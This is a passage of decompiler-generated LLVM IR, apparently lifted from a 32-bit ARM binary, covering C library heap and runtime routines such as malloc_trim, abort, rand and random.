  store i32 %v4_f434, i32* %lr.global-to-local, align 4
  %v0_f438 = load i32, i32* %ip.global-to-local, align 4
  %v3_f438 = udiv i32 %v0_f438, 8
  store i32 %v3_f438, i32* %r1.global-to-local, align 4
  %v1_f43c = add i32 %v3_f434, -4
  store i32 %v1_f43c, i32* %r2.global-to-local, align 4
  %v4_f440 = mul nuw i32 %v3_f438, 4
  %v5_f440 = add i32 %v4_f440, %v1_f43c
  %v6_f440 = inttoptr i32 %v5_f440 to i32*
  %v7_f440 = load i32, i32* %v6_f440, align 4
  store i32 %v7_f440, i32* %r3.global-to-local, align 4
  %v1_f444 = load i32, i32* @r5, align 4
  %v2_f444 = add i32 %v1_f444, 8
  %v3_f444 = inttoptr i32 %v2_f444 to i32*
  store i32 %v7_f440, i32* %v3_f444, align 4
  %v0_f448 = load i32, i32* @r5, align 4
  %v1_f448 = load i32, i32* %r2.global-to-local, align 4
  %v2_f448 = load i32, i32* %r1.global-to-local, align 4
  %v5_f448 = mul i32 %v2_f448, 4
  %v6_f448 = add i32 %v5_f448, %v1_f448
  %v7_f448 = inttoptr i32 %v6_f448 to i32*
  store i32 %v0_f448, i32* %v7_f448, align 4
  br label %dec_label_pc_f5b4

dec_label_pc_f450:                                ; preds = %dec_label_pc_f3d0
  %v1_f450 = and i32 %v3_f414, 2
  %v2_f450 = icmp eq i32 %v1_f450, 0
  br i1 %v2_f450, label %dec_label_pc_f458, label %dec_label_pc_f58c

dec_label_pc_f458:                                ; preds = %dec_label_pc_f450
  %v1_f458 = or i32 %v2_f418, 1
  store i32 %v1_f458, i32* %r3.global-to-local, align 4
  store i32 %v1_f458, i32* %v1_f418, align 4
  %v0_f460 = load i32, i32* @r6, align 4
  %v1_f460 = add i32 %v0_f460, -4
  %v2_f460 = inttoptr i32 %v1_f460 to i32*
  %v3_f460 = load i32, i32* %v2_f460, align 4
  store i32 %v3_f460, i32* %r3.global-to-local, align 4
  %v0_f464 = load i32, i32* @r5, align 4
  %v1_f464 = load i32, i32* %ip.global-to-local, align 4
  %v2_f464 = add i32 %v1_f464, %v0_f464
  store i32 %v2_f464, i32* %lr.global-to-local, align 4
  %v1_f468 = urem i32 %v3_f460, 2
  %v2_f468 = icmp eq i32 %v1_f468, 0
  %v1_f46c = add i32 %v2_f464, 4
  %v2_f46c = inttoptr i32 %v1_f46c to i32*
  %v3_f46c = load i32, i32* %v2_f46c, align 4
  store i32 %v3_f46c, i32* %r8.global-to-local, align 4
  br i1 %v2_f468, label %dec_label_pc_f474, label %dec_label_pc_f4a8

dec_label_pc_f474:                                ; preds = %dec_label_pc_f458
  %v1_f474 = add i32 %v0_f460, -8
  %v2_f474 = inttoptr i32 %v1_f474 to i32*
  %v3_f474 = load i32, i32* %v2_f474, align 4
  store i32 %v3_f474, i32* %r1.global-to-local, align 4
  %v2_f478 = sub i32 %v0_f464, %v3_f474
  store i32 %v2_f478, i32* %r3.global-to-local, align 4
  %v1_f47c = add i32 %v2_f478, 8
  %v2_f47c = inttoptr i32 %v1_f47c to i32*
  %v3_f47c = load i32, i32* %v2_f47c, align 4
  store i32 %v3_f47c, i32* %r2.global-to-local, align 4
  %v1_f480 = add i32 %v3_f47c, 12
  %v2_f480 = inttoptr i32 %v1_f480 to i32*
  %v3_f480 = load i32, i32* %v2_f480, align 4
  store i32 %v3_f480, i32* %r4.global-to-local, align 4
  %v9_f484 = icmp eq i32 %v3_f480, %v2_f478
  %v1_f488 = add i32 %v2_f478, 12
  %v2_f488 = inttoptr i32 %v1_f488 to i32*
  %v3_f488 = load i32, i32* %v2_f488, align 4
  store i32 %v3_f488, i32* %r0.global-to-local, align 4
  br i1 %v9_f484, label %dec_label_pc_f490, label %dec_label_pc_f4f4

dec_label_pc_f490:                                ; preds = %dec_label_pc_f474
  %v1_f490 = add i32 %v3_f488, 8
  %v2_f490 = inttoptr i32 %v1_f490 to i32*
  %v3_f490 = load i32, i32* %v2_f490, align 4
  store i32 %v3_f490, i32* %r3.global-to-local, align 4
  %v9_f494 = icmp eq i32 %v3_f490, %v2_f478
  br i1 %v9_f494, label %dec_label_pc_f49c, label %dec_label_pc_f4f4

dec_label_pc_f49c:                                ; preds = %dec_label_pc_f490
  store i32 %v3_f47c, i32* %v2_f490, align 4
  %v0_f4a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_f4a0 = load i32, i32* %r2.global-to-local, align 4
  %v2_f4a0 = add i32 %v1_f4a0, 12
  %v3_f4a0 = inttoptr i32 %v2_f4a0 to i32*
  store i32 %v0_f4a0, i32* %v3_f4a0, align 4
  %v0_f4a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_f4a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_f4a4 = add i32 %v1_f4a4, %v0_f4a4
  store i32 %v2_f4a4, i32* %ip.global-to-local, align 4
  %v0_f4b4.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_f4b8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_f4a8

dec_label_pc_f4a8:                                ; preds = %dec_label_pc_f458, %dec_label_pc_f49c
  %v0_f534 = phi i32 [ %v1_f464, %dec_label_pc_f458 ], [ %v2_f4a4, %dec_label_pc_f49c ]
  %v0_f4b8 = phi i32 [ %v3_f46c, %dec_label_pc_f458 ], [ %v0_f4b8.pre, %dec_label_pc_f49c ]
  %v1_f4cc = phi i32 [ %v2_f464, %dec_label_pc_f458 ], [ %v0_f4b4.pre, %dec_label_pc_f49c ]
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_f4ac = load i32, i32* @r7, align 4
  %v2_f4ac = add i32 %v0_f4ac, 68
  %v3_f4ac = inttoptr i32 %v2_f4ac to i32*
  %v4_f4ac = load i32, i32* %v3_f4ac, align 4
  store i32 %v4_f4ac, i32* %r2.global-to-local, align 4
  %v1_f4b0 = add i32 %v4_f4ac, 44
  %v2_f4b0 = inttoptr i32 %v1_f4b0 to i32*
  %v3_f4b0 = load i32, i32* %v2_f4b0, align 4
  store i32 %v3_f4b0, i32* %r3.global-to-local, align 4
  %v9_f4b4 = icmp eq i32 %v1_f4cc, %v3_f4b0
  %v1_f4b8 = and i32 %v0_f4b8, -4
  store i32 %v1_f4b8, i32* %r0.global-to-local, align 4
  br i1 %v9_f4b4, label %dec_label_pc_f534, label %dec_label_pc_f4c0

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f4a8
  %v2_f4c0 = add i32 %v1_f4cc, %v1_f4b8
  store i32 %v2_f4c0, i32* %r3.global-to-local, align 4
  %v1_f4c4 = add i32 %v2_f4c0, 4
  %v2_f4c4 = inttoptr i32 %v1_f4c4 to i32*
  %v3_f4c4 = load i32, i32* %v2_f4c4, align 4
  store i32 %v3_f4c4, i32* %r3.global-to-local, align 4
  %v1_f4c8 = urem i32 %v3_f4c4, 2
  %v2_f4c8 = icmp eq i32 %v1_f4c8, 0
  %v2_f4cc = add i32 %v1_f4cc, 4
  %v3_f4cc = inttoptr i32 %v2_f4cc to i32*
  store i32 %v1_f4b8, i32* %v3_f4cc, align 4
  br i1 %v2_f4c8, label %dec_label_pc_f4d4, label %dec_label_pc_f4c0.dec_label_pc_f504_crit_edge

dec_label_pc_f4c0.dec_label_pc_f504_crit_edge:    ; preds = %dec_label_pc_f4c0
  %v0_f514.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f504

dec_label_pc_f4d4:                                ; preds = %dec_label_pc_f4c0
  %v0_f4d4 = load i32, i32* %lr.global-to-local, align 4
  %v1_f4d4 = add i32 %v0_f4d4, 8
  %v2_f4d4 = inttoptr i32 %v1_f4d4 to i32*
  %v3_f4d4 = load i32, i32* %v2_f4d4, align 4
  store i32 %v3_f4d4, i32* %r1.global-to-local, align 4
  %v1_f4d8 = add i32 %v3_f4d4, 12
  %v2_f4d8 = inttoptr i32 %v1_f4d8 to i32*
  %v3_f4d8 = load i32, i32* %v2_f4d8, align 4
  store i32 %v3_f4d8, i32* %r3.global-to-local, align 4
  %v9_f4dc = icmp eq i32 %v3_f4d8, %v0_f4d4
  %v1_f4e0 = add i32 %v0_f4d4, 12
  %v2_f4e0 = inttoptr i32 %v1_f4e0 to i32*
  %v3_f4e0 = load i32, i32* %v2_f4e0, align 4
  store i32 %v3_f4e0, i32* %r2.global-to-local, align 4
  br i1 %v9_f4dc, label %dec_label_pc_f4e8, label %dec_label_pc_f4f4

dec_label_pc_f4e8:                                ; preds = %dec_label_pc_f4d4
  %v1_f4e8 = add i32 %v3_f4e0, 8
  %v2_f4e8 = inttoptr i32 %v1_f4e8 to i32*
  %v3_f4e8 = load i32, i32* %v2_f4e8, align 4
  store i32 %v3_f4e8, i32* %r3.global-to-local, align 4
  %v9_f4ec = icmp eq i32 %v3_f4e8, %v0_f4d4
  br i1 %v9_f4ec, label %dec_label_pc_f4f8, label %dec_label_pc_f4f4

dec_label_pc_f4f4:                                ; preds = %dec_label_pc_f4d4, %dec_label_pc_f490, %dec_label_pc_f474, %dec_label_pc_f4e8
  %v0_f4f4 = call i32 @abort()
  store i32 %v0_f4f4, i32* %r0.global-to-local, align 4
  %v0_f4f8.pre = load i32, i32* @r1, align 4
  %v1_f4f8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_f4f8

dec_label_pc_f4f8:                                ; preds = %dec_label_pc_f4e8, %dec_label_pc_f4f4
  %v1_f4f8 = phi i32 [ %v3_f4e0, %dec_label_pc_f4e8 ], [ %v1_f4f8.pre, %dec_label_pc_f4f4 ]
  %v0_f4f8 = phi i32 [ %v3_f4d4, %dec_label_pc_f4e8 ], [ %v0_f4f8.pre, %dec_label_pc_f4f4 ]
  %v2_f4f8 = add i32 %v1_f4f8, 8
  %v3_f4f8 = inttoptr i32 %v2_f4f8 to i32*
  store i32 %v0_f4f8, i32* %v3_f4f8, align 4
  %v0_f4fc = load i32, i32* %r2.global-to-local, align 4
  %v1_f4fc = load i32, i32* %r1.global-to-local, align 4
  %v2_f4fc = add i32 %v1_f4fc, 12
  %v3_f4fc = inttoptr i32 %v2_f4fc to i32*
  store i32 %v0_f4fc, i32* %v3_f4fc, align 4
  %v0_f500 = load i32, i32* %ip.global-to-local, align 4
  %v1_f500 = load i32, i32* %r0.global-to-local, align 4
  %v2_f500 = add i32 %v1_f500, %v0_f500
  store i32 %v2_f500, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f504

dec_label_pc_f504:                                ; preds = %dec_label_pc_f4c0.dec_label_pc_f504_crit_edge, %dec_label_pc_f4f8
  %v0_f514 = phi i32 [ %v0_f514.pre, %dec_label_pc_f4c0.dec_label_pc_f504_crit_edge ], [ %v2_f500, %dec_label_pc_f4f8 ]
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_f508 = load i32, i32* @r7, align 4
  %v2_f508 = add i32 %v0_f508, 68
  %v3_f508 = inttoptr i32 %v2_f508 to i32*
  %v4_f508 = load i32, i32* %v3_f508, align 4
  %v1_f50c = add i32 %v4_f508, 52
  store i32 %v1_f50c, i32* %r3.global-to-local, align 4
  %v1_f510 = add i32 %v4_f508, 60
  %v2_f510 = inttoptr i32 %v1_f510 to i32*
  %v3_f510 = load i32, i32* %v2_f510, align 4
  store i32 %v3_f510, i32* %r1.global-to-local, align 4
  %v1_f514 = or i32 %v0_f514, 1
  store i32 %v1_f514, i32* %r2.global-to-local, align 4
  %v1_f518 = load i32, i32* %r4.global-to-local, align 4
  %v2_f518 = add i32 %v1_f518, 12
  %v3_f518 = inttoptr i32 %v2_f518 to i32*
  store i32 %v1_f50c, i32* %v3_f518, align 4
  %v0_f51c = load i32, i32* %r1.global-to-local, align 4
  %v1_f51c = load i32, i32* %r4.global-to-local, align 4
  %v2_f51c = add i32 %v1_f51c, 8
  %v3_f51c = inttoptr i32 %v2_f51c to i32*
  store i32 %v0_f51c, i32* %v3_f51c, align 4
  %v0_f520 = load i32, i32* %r2.global-to-local, align 4
  %v1_f520 = load i32, i32* %r4.global-to-local, align 4
  %v2_f520 = add i32 %v1_f520, 4
  %v3_f520 = inttoptr i32 %v2_f520 to i32*
  store i32 %v0_f520, i32* %v3_f520, align 4
  %v0_f524 = load i32, i32* %ip.global-to-local, align 4
  %v1_f524 = load i32, i32* %r4.global-to-local, align 4
  %v3_f524 = add i32 %v1_f524, %v0_f524
  %v4_f524 = inttoptr i32 %v3_f524 to i32*
  store i32 %v0_f524, i32* %v4_f524, align 4
  %v0_f528 = load i32, i32* %r4.global-to-local, align 4
  %v1_f528 = load i32, i32* %r1.global-to-local, align 4
  %v2_f528 = add i32 %v1_f528, 12
  %v3_f528 = inttoptr i32 %v2_f528 to i32*
  store i32 %v0_f528, i32* %v3_f528, align 4
  %v0_f52c = load i32, i32* %r4.global-to-local, align 4
  %v1_f52c = load i32, i32* %r3.global-to-local, align 4
  %v2_f52c = add i32 %v1_f52c, 8
  %v3_f52c = inttoptr i32 %v2_f52c to i32*
  store i32 %v0_f52c, i32* %v3_f52c, align 4
  br label %dec_label_pc_f544

dec_label_pc_f534:                                ; preds = %dec_label_pc_f4a8
  %v2_f534 = add i32 %v1_f4b8, %v0_f534
  store i32 %v2_f534, i32* %ip.global-to-local, align 4
  %v1_f538 = or i32 %v2_f534, 1
  store i32 %v1_f538, i32* %r3.global-to-local, align 4
  %v0_f53c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f53c, i32* %v2_f4b0, align 4
  %v0_f540 = load i32, i32* %r3.global-to-local, align 4
  %v1_f540 = load i32, i32* %r4.global-to-local, align 4
  %v2_f540 = add i32 %v1_f540, 4
  %v3_f540 = inttoptr i32 %v2_f540 to i32*
  store i32 %v0_f540, i32* %v3_f540, align 4
  br label %dec_label_pc_f544

dec_label_pc_f544:                                ; preds = %dec_label_pc_f504, %dec_label_pc_f534
  %v0_f544 = load i32, i32* %ip.global-to-local, align 4
  %v3_f548 = icmp ult i32 %v0_f544, 131070
  br i1 %v3_f548, label %dec_label_pc_f5b4, label %dec_label_pc_f54c

dec_label_pc_f54c:                                ; preds = %dec_label_pc_f544
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_f550 = load i32, i32* @r7, align 4
  %v2_f550 = add i32 %v0_f550, 68
  %v3_f550 = inttoptr i32 %v2_f550 to i32*
  %v4_f550 = load i32, i32* %v3_f550, align 4
  store i32 %v4_f550, i32* @r4, align 4
  %v1_f554 = inttoptr i32 %v4_f550 to i32*
  %v2_f554 = load i32, i32* %v1_f554, align 4
  store i32 %v2_f554, i32* %r3.global-to-local, align 4
  %v1_f558 = and i32 %v2_f554, 2
  %v2_f558 = icmp eq i32 %v1_f558, 0
  br i1 %v2_f558, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_f54c
  store i32 %v4_f550, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_f54c, %bb
  %v1_f560 = xor i1 %v2_f558, true
  call void @__pseudo_cond_branch(i1 %v1_f560, i32 ptrtoint (i32* @global_var_f204.340 to i32))
  %v0_f564 = load i32, i32* @r4, align 4
  %v1_f564 = add i32 %v0_f564, 44
  %v2_f564 = inttoptr i32 %v1_f564 to i32*
  %v3_f564 = load i32, i32* %v2_f564, align 4
  store i32 %v3_f564, i32* %r3.global-to-local, align 4
  %v1_f568 = add i32 %v3_f564, 4
  %v2_f568 = inttoptr i32 %v1_f568 to i32*
  %v3_f568 = load i32, i32* %v2_f568, align 4
  store i32 %v3_f568, i32* %r3.global-to-local, align 4
  %v1_f56c = add i32 %v0_f564, 836
  %v2_f56c = inttoptr i32 %v1_f56c to i32*
  %v3_f56c = load i32, i32* %v2_f56c, align 4
  store i32 %v3_f56c, i32* %r2.global-to-local, align 4
  %v1_f570 = and i32 %v3_f568, -4
  store i32 %v1_f570, i32* %r3.global-to-local, align 4
  %v3_f574 = icmp ult i32 %v1_f570, %v3_f56c
  br i1 %v3_f574, label %dec_label_pc_f5b4, label %dec_label_pc_f57c

dec_label_pc_f57c:                                ; preds = %bb16
  store i32 %v0_f564, i32* %r1.global-to-local, align 4
  %v1_f580 = add i32 %v0_f564, 840
  %v2_f580 = inttoptr i32 %v1_f580 to i32*
  %v3_f580 = load i32, i32* %v2_f580, align 4
  store i32 %v3_f580, i32* %r0.global-to-local, align 4
  %v2_f584 = call i32 @__malloc_trim(i32 %v3_f580, i32 %v0_f564)
  store i32 %v2_f584, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f5b4

dec_label_pc_f58c:                                ; preds = %dec_label_pc_f450
  %v2_f58c = inttoptr i32 %v1_f420 to i32*
  %v3_f58c = load i32, i32* %v2_f58c, align 4
  store i32 %v3_f58c, i32* %r0.global-to-local, align 4
  %v1_f590 = add i32 %v4_f410, 848
  %v2_f590 = inttoptr i32 %v1_f590 to i32*
  %v3_f590 = load i32, i32* %v2_f590, align 4
  store i32 %v3_f590, i32* %r2.global-to-local, align 4
  %v1_f594 = add i32 %v4_f410, 868
  %v2_f594 = inttoptr i32 %v1_f594 to i32*
  %v3_f594 = load i32, i32* %v2_f594, align 4
  %v2_f598 = add i32 %v3_f58c, %v1_f41c
  store i32 %v2_f598, i32* %r1.global-to-local, align 4
  %v1_f59c = add i32 %v3_f590, -1
  store i32 %v1_f59c, i32* %r2.global-to-local, align 4
  %v2_f5a0 = sub i32 %v3_f594, %v2_f598
  store i32 %v2_f5a0, i32* %r3.global-to-local, align 4
  store i32 %v2_f5a0, i32* %v2_f594, align 4
  %v1_f5a8 = load i32, i32* @lr, align 4
  %v2_f5a8 = add i32 %v1_f5a8, 848
  %v3_f5a8 = inttoptr i32 %v2_f5a8 to i32*
  store i32 %v1_f59c, i32* %v3_f5a8, align 4
  %v0_f5ac = load i32, i32* %r0.global-to-local, align 4
  %v1_f5ac = load i32, i32* @r5, align 4
  %v2_f5ac = sub i32 %v1_f5ac, %v0_f5ac
  store i32 %v2_f5ac, i32* %r0.global-to-local, align 4
  %v4_f5b0 = call i32 @munmap(i32 %v2_f5ac, i32 %v2_f598, i32 %v1_f59c, i32 %v2_f5a0)
  store i32 %v4_f5b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f5b4

dec_label_pc_f5b4:                                ; preds = %bb16, %dec_label_pc_f544, %dec_label_pc_f57c, %dec_label_pc_f430, %dec_label_pc_f58c
  store i32 %v2_f3c4, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 48, i32* @r3, align 4
  %v0_f5c0 = load i32, i32* @r7, align 4
  %v2_f5c0 = add i32 %v0_f5c0, 48
  %v3_f5c0 = inttoptr i32 %v2_f5c0 to i32*
  %v4_f5c0 = load i32, i32* %v3_f5c0, align 4
  store i32 %v4_f5c0, i32* @ip, align 4
  store i32 62924, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_f5c0)
  br label %dec_label_pc_f5cc

dec_label_pc_f5cc:                                ; preds = %entry, %dec_label_pc_f5b4
  store i32 %v3_f3b8, i32* @r4, align 4
  store i32 %v6_f3b8, i32* @r5, align 4
  store i32 %v9_f3b8, i32* @r6, align 4
  store i32 %v12_f3b8, i32* @r7, align 4
  store i32 %v18_f3b8, i32* @lr, align 4
  ret i32 %v2_f3c4

; uselistorder directives
  uselistorder i32 %v0_f564, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_f524, { 1, 0 }
  uselistorder i32 %v1_f464, { 1, 0 }
  uselistorder i32 %v0_f464, { 1, 0 }
  uselistorder i32 %v3_f438, { 1, 0 }
  uselistorder i32 %v1_f41c, { 1, 0, 2 }
  uselistorder i32 %v2_f418, { 1, 2, 0, 3 }
  uselistorder i32 %v4_f410, { 1, 0, 2, 3 }
  uselistorder i32 %v0_f3c0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 6, 5, 7, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 848, { 3, 4, 0, 1, 2 }
  uselistorder i32 840, { 1, 2, 0 }
  uselistorder i32 836, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_f5cc, { 1, 0 }
  uselistorder label %dec_label_pc_f5b4, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_f544, { 1, 0 }
  uselistorder label %dec_label_pc_f504, { 1, 0 }
  uselistorder label %dec_label_pc_f4f8, { 1, 0 }
  uselistorder label %dec_label_pc_f4f4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_f4a8, { 1, 0 }
}

define i32 @function_f5dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_f5dc:
  %v0_f5dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f5dc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_f5dc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_f5dc, %bb
  %v10_f5f0 = phi i32 [ %arg1, %dec_label_pc_f5dc ], [ 0, %bb ]
  ret i32 %v10_f5f0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_f5f4 = load i32, i32* @r4, align 4
  store i32 %v3_f5f4, i32* %stack_var_-12, align 4
  %v6_f5f4 = load i32, i32* @r5, align 4
  %v4_f604 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_f604, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_f604, i32* @r0, align 4
  %v0_f614 = call i32 @__malloc_consolidate()
  %v0_f618 = load i32, i32* @r4, align 4
  %v0_f61c = load i32, i32* @r5, align 4
  %v2_f624 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f624, i32* @r4, align 4
  store i32 %v6_f5f4, i32* @r5, align 4
  %v2_f628 = call i32 @__malloc_trim(i32 %v0_f618, i32 %v0_f61c)
  %v0_f62c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f62c, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v1_f62c = load i32, i32* @r3, align 4
  %v4_f62c = inttoptr i32 %v0_f61c to i32*
  store i32 %v1_f62c, i32* %v4_f62c, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_f630 = phi i32 [ %v2_f628, %entry ], [ 0, %bb ]
  ret i32 %v4_f630

; uselistorder directives
  uselistorder i32 %v0_f61c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r5, align 4
  %v4_f64c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 16) to i32*), align 4
  store i32 63064, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_f64c)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_f674 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_f67c = load i32, i32* @r5, align 4
  %v2_f67c = add i32 %v0_f67c, 10596
  %v3_f67c = inttoptr i32 %v2_f67c to i32*
  %v4_f67c = load i32, i32* %v3_f67c, align 4
  %v2_f680 = icmp eq i32 %v4_f67c, 0
  br i1 %v2_f680, label %dec_label_pc_f688, label %dec_label_pc_f6c8

dec_label_pc_f688:                                ; preds = %entry
  store i32 1, i32* %v3_f67c, align 4
  br label %dec_label_pc_f690

dec_label_pc_f690:                                ; preds = %dec_label_pc_f6d8, %dec_label_pc_f688
  %v0_f694 = load i32, i32* @r5, align 4
  %v2_f694 = add i32 %v0_f694, 564
  store i32 %v2_f694, i32* @r4, align 4
  %v2_f6a0 = add i32 %v0_f694, 72
  %v3_f6a0 = inttoptr i32 %v2_f6a0 to i32*
  %v4_f6a0 = load i32, i32* %v3_f6a0, align 4
  call void @__pseudo_branch(i32 %v4_f6a0)
  %v1_f6b0 = call i32 @__GI_raise(i32 6)
  %v0_f6bc = load i32, i32* @r5, align 4
  %v2_f6bc = add i32 %v0_f6bc, 16
  %v3_f6bc = inttoptr i32 %v2_f6bc to i32*
  %v4_f6bc = load i32, i32* %v3_f6bc, align 4
  store i32 63176, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_f6bc)
  %v0_f6cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f6c8

dec_label_pc_f6c8:                                ; preds = %entry, %dec_label_pc_f690
  %v1_f6e0 = phi i32 [ %v0_f67c, %entry ], [ %v0_f6cc.pre, %dec_label_pc_f690 ]
  %v2_f6cc = add i32 %v1_f6e0, 10596
  %v3_f6cc = inttoptr i32 %v2_f6cc to i32*
  %v4_f6cc = load i32, i32* %v3_f6cc, align 4
  %v7_f6d0 = icmp eq i32 %v4_f6cc, 1
  br i1 %v7_f6d0, label %dec_label_pc_f6d8, label %dec_label_pc_f714

dec_label_pc_f6d8:                                ; preds = %dec_label_pc_f6c8
  %v2_f6d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_f6d8, i32* @r4, align 4
  store i32 2, i32* %v3_f6cc, align 4
  %v3_f6f0 = bitcast i32* %stack_var_-28 to i8*
  %v4_f6f0 = call i32 @__GI_memset(i8* %v3_f6f0, i32 0, i32 20)
  %v6_f70c = call i32 @__libc_sigaction(i32 6, i32 %v2_f6d8, i32 0, i32 -1, i32 -1, i32 -1)
  br label %dec_label_pc_f690

dec_label_pc_f714:                                ; preds = %dec_label_pc_f6c8
  %v7_f714 = icmp eq i32 %v4_f6cc, 2
  br i1 %v7_f714, label %dec_label_pc_f71c, label %dec_label_pc_f728

dec_label_pc_f71c:                                ; preds = %dec_label_pc_f714
  store i32 3, i32* %v3_f6cc, align 4
  %v0_f724 = call i32 @abort()
  %v0_f728.pre = load i32, i32* @r5, align 4
  %v1_f728.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_f728

dec_label_pc_f728:                                ; preds = %dec_label_pc_f714, %dec_label_pc_f71c
  %v3_f734 = phi i32 [ 10596, %dec_label_pc_f714 ], [ %v1_f728.pre, %dec_label_pc_f71c ]
  %v2_f734 = phi i32 [ %v1_f6e0, %dec_label_pc_f714 ], [ %v0_f728.pre, %dec_label_pc_f71c ]
  %v2_f728 = add i32 %v2_f734, %v3_f734
  %v3_f728 = inttoptr i32 %v2_f728 to i32*
  %v4_f728 = load i32, i32* %v3_f728, align 4
  %v7_f72c = icmp eq i32 %v4_f728, 3
  br i1 %v7_f72c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_f728
  store i32 4, i32* %v3_f728, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_f728, %bb
  call void @__pseudo_cond_branch(i1 %v7_f72c, i32 ptrtoint (i32* @global_var_11c1c.349 to i32))
  br label %dec_label_pc_f740

dec_label_pc_f740:                                ; preds = %dec_label_pc_f740, %.thread2
  %v0_f740 = call i32 @abort()
  br label %dec_label_pc_f740

; uselistorder directives
  uselistorder i32* %v3_f6cc, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_f728, { 1, 0 }
  uselistorder label %dec_label_pc_f6c8, { 1, 0 }
}

define i32 @function_f74c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f74c:
  %v0_f74c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f74c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_f74c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_f74c, %bb
  %v4_f758 = phi i32 [ %arg1, %dec_label_pc_f74c ], [ 0, %bb ]
  ret i32 %v4_f758

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_f764 = call i32 @random()
  ret i32 %v0_f764
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_f774 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r4, align 4
  %v4_f7a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_f7a4)
  %v0_f7b8 = load i32, i32* @r4, align 4
  %v2_f7b8 = add i32 %v0_f7b8, 16
  %v3_f7b8 = inttoptr i32 %v2_f7b8 to i32*
  %v4_f7b8 = load i32, i32* %v3_f7b8, align 4
  store i32 ptrtoint (i32* @global_var_f7c4.355 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_f7b8)
